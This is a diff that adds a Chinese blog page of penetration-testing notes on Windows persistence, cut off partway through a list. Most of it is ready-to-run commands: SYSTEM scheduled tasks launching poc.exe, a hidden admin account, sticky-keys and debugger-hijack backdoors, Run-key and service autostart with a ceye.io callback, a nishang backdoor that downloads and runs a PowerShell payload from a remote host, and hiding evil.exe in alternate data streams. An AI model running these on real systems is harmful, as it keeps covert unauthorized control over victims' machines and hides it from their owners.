@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>权限维持 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="内网,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/内网/"><i class="fa fa-bookmark"></i>内网</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    权限维持
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">计划任务</span><br><span class="line">	SharPersist：一款渗透测试中实现Windows系统常驻的套件</span><br><span class="line">	/sc   计划任务类型，可选值为MINUTE、HOURLY、DAILY、WEEKLY、ONCE、ONSTART、ONLOGON、ONIDLE、MONTHLY、ONEVENT</span><br><span class="line">/tn   计划任务名称，后续查询、修改、删除、执行时使用</span><br><span class="line">/tr   需要运行的程序或命令，传入的命令中间如果有空格会被截断为程序和参数，因此需要将双引号转义并传入。</span><br><span class="line">/ru   运行任务的用户账户名，不使用此参数的话使用执行schtasks命令的账户运行计划任务</span><br><span class="line">/rp   运行任务的用户账户密码</span><br><span class="line">/mo   指定任务在计划类型中的运行间隔</span><br><span class="line">/d    指定任务在一个月或者星期的某一天运行，只适用于MONTHLY和WEEKLY类型。</span><br><span class="line">/m    指定任务在某个月运行，只适用于MONTHLY类型。</span><br><span class="line">/i    当计划任务类型为ONIDLE时，运行任务前计算机处于空闲状态的分钟数。</span><br><span class="line">st    当计划任务类型为MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY时使用，指定任务的开始时间，默认为本地计算机的当前时间。</span><br><span class="line">/ri   指定计划任务的重复间隔，以分钟为单位。不适合计划类型：MINUTE、HOURLY、ONSTART、ONLOGON、ONIDLE</span><br><span class="line">/et   指定计划任务的结束时间，适用于计划类型：MINUTE、HOURLY， 在指定的结束时间之后，schtasks 不会再次启动任务，除非当前系统时间调回开始时间。默认情况下，没有结束时间。</span><br><span class="line">/du   指定任务计划的持续时间，与/et类似，默认情况下没有持续时间。</span><br><span class="line">/k    在指定计划任务的结束时间或持续时间后停止任务，如果不加此参数，则在时间到了会继续运行或者重启该任务。</span><br><span class="line">/it   只在用户登录时运行</span><br><span class="line">/z    在任务计划完成后删除任务计划</span><br><span class="line">/f    在创建任务时如果任务已存在不显示警告</span><br><span class="line">/RL   为作业设置运行级别。有效值为LIMITED 和 HIGHEST。默认值为 LIMITED。</span><br><span class="line">/F    如果指定的任务已经存在，则强制创建任务并抑制警告。</span><br><span class="line"></span><br><span class="line">	当使用了/sc参数为MINUTE、HOURLY、DAILY、WEEKLY时，我们需要指定/mo运行的间隔时间</span><br><span class="line"></span><br><span class="line">        MINUTE:  1 到 1439 分钟。</span><br><span class="line">        HOURLY:  1 - 23 小时。</span><br><span class="line">        DAILY:   1 到 365 天。</span><br><span class="line">        WEEKLY:  1 到 52 周。</span><br><span class="line">        ONCE:    无修改者。</span><br><span class="line">        ONSTART: 无修改者。</span><br><span class="line">        ONLOGON: 无修改者。</span><br><span class="line">        ONIDLE:  无修改者。</span><br><span class="line">        MONTHLY: 1 到 12，或</span><br><span class="line">        FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。</span><br><span class="line">        ONEVENT:  XPath 事件查询字符串。</span><br><span class="line"></span><br><span class="line">	1. 创建名为test的计划任务，每隔一分钟运行一次，任务执行时指定执行的程序为calc.exe</span><br><span class="line"></span><br><span class="line">重启后也会执行</span><br><span class="line"></span><br><span class="line">    schtasks /create /sc minute /mo 1 /tn test /tr C:\WINDOWS\system32\calc.exe</span><br><span class="line">     </span><br><span class="line">    #以system权限运行</span><br><span class="line">    schtasks /create /sc minute /mo 1 /tn test /tr C:\WINDOWS\system32\calc.exe /ru system</span><br><span class="line"></span><br><span class="line">	2. 开机上线</span><br><span class="line">（1）系统启动时上线，无需登录</span><br><span class="line">系统启动时运行poc.exe，但只当指定了运行账号为system时才成功上线</span><br><span class="line">		schtasks /create /tn test /tr C:\Users\Administrator\Desktop\poc.exe /sc onstart /ru                     不运行（计划任务显示准备就绪）</span><br><span class="line">		schtasks /create /tn test /tr C:\Users\Administrator\Desktop\poc.exe /sc onstart /ru administrator  不运行（计划任务显示准备就绪）</span><br><span class="line">	schtasks /create /tn test /tr C:\Users\Administrator\Desktop\poc.exe /sc onstart /ru system         成功运行，启动计算机即上线，无需登录账号，所以不管用哪个账号登录都会上线</span><br><span class="line"></span><br><span class="line">	（2）账号登录时上线</span><br><span class="line"></span><br><span class="line">	schtasks /create /tn test /tr C:\Users\Administrator\Desktop\poc.exe /sc onlogon   如添加计划任务时使用的账号，登录成功后即上线</span><br><span class="line"></span><br><span class="line">	实用案例</span><br><span class="line">1. 创建计划任务&quot;updatex&quot;，触发程序为poc.exe，运行级别为高级别，以system权限每隔四个小时运行一次</span><br><span class="line">	schtasks /create /tn &quot;updatex&quot; /tr C:\Users\Administrator\Desktop\poc.exe /rl highest /F /sc hourly /mo 4 /RU system</span><br><span class="line"></span><br><span class="line">常规</span><br><span class="line">	1、隐藏账号</span><br><span class="line">	net user teamssix$ Passw0rd /add</span><br><span class="line">net localgroup administrators teamssix$ /add</span><br><span class="line">	https://github.com/wgpsec/CreateHiddenAccount</span><br><span class="line"></span><br><span class="line">CreateHiddenAccount.exe -u teamssix -p Passw0rd</span><br><span class="line"></span><br><span class="line">会卡</span><br><span class="line"></span><br><span class="line">创建完后，通过 net user 和控制面板等等都是看不到这个账号的。</span><br><span class="line"></span><br><span class="line">也可以拿来检查当前系统的隐藏账号</span><br><span class="line"></span><br><span class="line">CreateHiddenAccount.exe -c</span><br><span class="line"></span><br><span class="line">删除用户也很方便</span><br><span class="line"></span><br><span class="line">CreateHiddenAccount.exe -d teamssix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	2、计划任务</span><br><span class="line">计划任务也是比较常见的权限维持方法，计划任务在 Win7 之前使用 at 命令，之后的系统中使用 schtasks 命令。</span><br><span class="line">例如每小时执行一次 calc.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /tn updater /tr calc.exe /sc hourly /mo 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	3、shift 后门</span><br><span class="line">这个也算是比较知名的后门方法了，直接使用 copy 命令即可</span><br><span class="line">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y</span><br><span class="line">如果提示访问被拒绝，可以在管理员权限下，加上 everyone 的权限再试试。</span><br><span class="line"></span><br><span class="line">cacls C:\Windows\System32\sethc.exe /T /E /G everyone:F</span><br><span class="line"></span><br><span class="line">然后在登录界面按 5 下 shift 键就能打开 cmd 窗口了。</span><br><span class="line">辅助工具 utilman.exe</span><br><span class="line"></span><br><span class="line">屏幕键盘 osk.exe</span><br><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br><span class="line"></span><br><span class="line">辅助工具 utilman.exe</span><br><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br><span class="line"></span><br><span class="line">	4、组策略</span><br><span class="line">新建一个 bat 文件，这里 bat 内容为 calc</span><br><span class="line">使用 gpedit.msc 进入本地组策略，来到用户配置--》Windows设置--》脚本登录，点击浏览选择 bat 文件，当用户登录时就会触发这个 bat 文件。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	5、注册表</span><br><span class="line">在系统启动的注册表下添加恶意程序，这样当用户登录系统时，exe 就会被运行，或者将 exe 直接放到系统启动的文件夹里也是一样的道理。</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Vmware Regg&quot; /t REG_SZ /d &quot;C:\Windows\System32\calc.exe&quot; /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	6、服务自启动</span><br><span class="line">直接使用命令创建服务</span><br><span class="line">sc create teamssix start=auto binPath=&quot;cmd.exe /k ping -n 1 test.xxx.ceye.io&quot; obj=Localsystem</span><br><span class="line"></span><br><span class="line">启动该服务</span><br><span class="line"></span><br><span class="line">net start teamssix</span><br><span class="line"></span><br><span class="line">sc.exe sdset teamssix &quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br><span class="line"></span><br><span class="line">使用以下命令就能恢复。</span><br><span class="line">&amp; $env:SystemRoot\System32\sc.exe sdset teamssix &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	7、nishang 后门</span><br><span class="line">nishang 是一个 PowerShell 项目，里面集成了众多工具，其中包含有制作后门的工具，nishang 项目下载地址：</span><br><span class="line">https://github.com/samratashok/nishang</span><br><span class="line"></span><br><span class="line">HTTP-Backdoor</span><br><span class="line">cd nishang\Backdoors</span><br><span class="line">Import-Module .\HTTP-Backdoor.ps1</span><br><span class="line">HTTP-Backdoor -CheckURL http://192.168.7.1/1.txt -PayloadURL http://192.168.7.1/calc.ps1 -MagicString start -StopString stop</span><br><span class="line"></span><br><span class="line">命令解释如下：</span><br><span class="line"></span><br><span class="line">    CheckURL 如果检测地址存在，再执行 Payload 里的脚本</span><br><span class="line"></span><br><span class="line">    PayloadURL 需要下载的 PowerShell 脚本地址</span><br><span class="line"></span><br><span class="line">    StopString 判断存在 -CheckURL 返回的字符串，则停止执行</span><br><span class="line"></span><br><span class="line">    MagicString 判断存在 -CheckURL 返回的字符串，则开始执行</span><br><span class="line"></span><br><span class="line">这个脚本感觉是挺有意思的，该脚本会不断读取 CheckURL 的内容，这里设置的 MagicString 为 start，那么当 http://192.168.7.1/1.txt 内容为 start 的时候，就会执行 http://192.168.7.1/calc.ps1 脚本。</span><br><span class="line"></span><br><span class="line">Add-ScrnSaveBackdoor</span><br><span class="line"></span><br><span class="line">Add-ScrnSaveBackdoor 脚本可以帮助攻击者利用 Windows 的屏幕保护程序来安装一个隐藏的后门，该脚本需要管理员权限。</span><br><span class="line"></span><br><span class="line">Import-Module .\Add-ScrnSaveBackdoor.ps1</span><br><span class="line">Add-ScrnSaveBackdoor -Payload &quot;Powershell.exe calc&quot;</span><br><span class="line"></span><br><span class="line">当屏幕保护程序启动时，就会运行 Payload 里的内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Windows 文件隐藏</span><br><span class="line">	1、文件属性</span><br><span class="line"></span><br><span class="line">		直接右击选择隐藏即可</span><br><span class="line">也可以使用 attrib +s +a +h +r  ----.exe命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	2、ADS</span><br><span class="line"></span><br><span class="line">		ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。</span><br><span class="line"></span><br><span class="line">echo teamssix &gt; CreateHiddenAccount_v0.2.exe:test.txt</span><br><span class="line"></span><br><span class="line">使用 dir 是看不到的，使用 dir /r 才可以</span><br><span class="line"></span><br><span class="line">如果想执行 exe 文件，可以先创建一个快捷方式，再执行。</span><br><span class="line"></span><br><span class="line">type evil.exe &gt; CreateHiddenAccount_v0.2.exe:evil.exe</span><br><span class="line">mklink &quot;C:\Users\test\Desktop\evillink.exe&quot; &quot;C:\Users\test\Desktop\CreateHiddenAccount_v0.2.exe:evil.exe&quot; // 需要管理员权限</span><br><span class="line">start evil.exe</span><br><span class="line"></span><br><span class="line">另外如果想删除这个隐藏文件，需要删除宿主文件才行。</span><br><span class="line"></span><br><span class="line">	3、系统文件夹伪装</span><br><span class="line"></span><br><span class="line">		例如这里有一个 test 文件夹，将 test 命名为 我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;，这时文件夹的图标就会变为「我的电脑」图标。</span><br><span class="line"></span><br><span class="line">使用 dir 可以看到里面的文件，但如果点击这个文件夹，就会真的进入到「我的电脑」界面里。</span><br><span class="line"></span><br><span class="line">下面是一些其他的常用标识符。</span><br><span class="line"></span><br><span class="line">上帝模式.&#123;ED7BA470-8E54-465E-825C-99712043E01C&#125;</span><br><span class="line">CLSIDexcel.&#123;00020810-0000-0000-C000-000000000046&#125;</span><br><span class="line">word.&#123;00020900-0000-0000-C000-000000000046&#125;</span><br><span class="line">media.&#123;00022603-0000-0000-C000-000000000046&#125;</span><br><span class="line">CAB.&#123;0CD7A5C0-9F37-11CE-AE65-08002B2E1262&#125;</span><br><span class="line">计划任务.&#123;148BD520-A2AB-11CE-B11F-00AA00530503&#125;</span><br><span class="line">搜索-计算机&#123;1f4de370-d627-11d1-ba4f-00a0c91eedba&#125;</span><br><span class="line">网上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">控制面板.&#123;21EC2020-3AEA-1069-A2DD-08002B30309D&#125;</span><br><span class="line">打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;</span><br><span class="line">html.&#123;25336920-03f9-11cf-8fd0-00aa00686f13&#125;</span><br><span class="line">mht.&#123;3050F3D9-98B5-11CF-BB82-00AA00BDCE0B&#125;</span><br><span class="line">mshta.&#123;3050f4d8-98B5-11CF-BB82-00AA00BDCE0B&#125;</span><br><span class="line">我的文档.&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125;</span><br><span class="line">XML.&#123;48123bc4-99d9-11d1-a6b3-00c04fd91555&#125;</span><br><span class="line">回收站(满).&#123;5ef4af3a-f726-11d0-b8a2-00c04fc309a4&#125;</span><br><span class="line">回收站.&#123;645FF040-5081-101B-9F08-00AA002F954E&#125;</span><br><span class="line">ftp_folder.&#123;63da6ec0-2e98-11cf-8d82-444553540000&#125;</span><br><span class="line">网络和拨号连接.&#123;7007ACC7-3202-11D1-AAD2-00805FC1270E&#125;</span><br><span class="line">写字板文档.&#123;73FDDC80-AEA9-101A-98A7-00AA00374959&#125;</span><br><span class="line">Temporary Offline Files Cleaner.&#123;750fdf0f-2a26-11d1-a3ea-080036587f03&#125;</span><br><span class="line">用户和密码.&#123;7A9D77BD-5403-11d2-8785-2E0420524153&#125;</span><br><span class="line">Internet 临时文件.&#123;7BD29E00-76C1-11CF-9DD0-00A0C9034933&#125;</span><br><span class="line">已下载的程序文件的清除程序.&#123;8369AB20-56C9-11D0-94E8-00AA0059CE02&#125;</span><br><span class="line">公文包.&#123;85BBD920-42A0-1069-A2E4-08002B30309D&#125;</span><br><span class="line">ActiveX 高速缓存文件夹.&#123;88C6C381-2E85-11D0-94DE-444553540000&#125;</span><br><span class="line">mail.&#123;9E56BE60-C50F-11CF-9A2C-00A0C90A90CE&#125;</span><br><span 